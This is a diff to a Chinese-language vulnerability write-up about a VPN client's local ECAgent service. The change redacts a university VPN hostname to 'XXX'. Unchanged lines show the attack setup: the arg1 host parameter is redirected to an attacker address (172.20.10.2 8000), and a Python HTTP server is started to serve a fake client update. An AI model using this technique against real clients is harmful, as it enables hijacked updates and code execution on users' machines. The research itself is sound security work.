@@ -59,10 +59,10 @@ DoQueryService -> 查询服务
 第一个初始化的请求存在可控参数arg1：
 
 ```
-https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=vpn.hqu.edu.cn%20443&callback=EA_cb10000
+https://127.0.0.1:54530/ECAgent/?op=InitECAgent&arg1=XXX%20443&callback=EA_cb10000
 ```
 
-参数`arg1=vpn.hqu.edu.cn%20443`，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为`172.20.10.2 8000`，然后本地搭建一个HTTP服务：
+参数`arg1=XXX%20443`，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为`172.20.10.2 8000`，然后本地搭建一个HTTP服务：
 
 ```python
 python -m SimpleHTTPServer
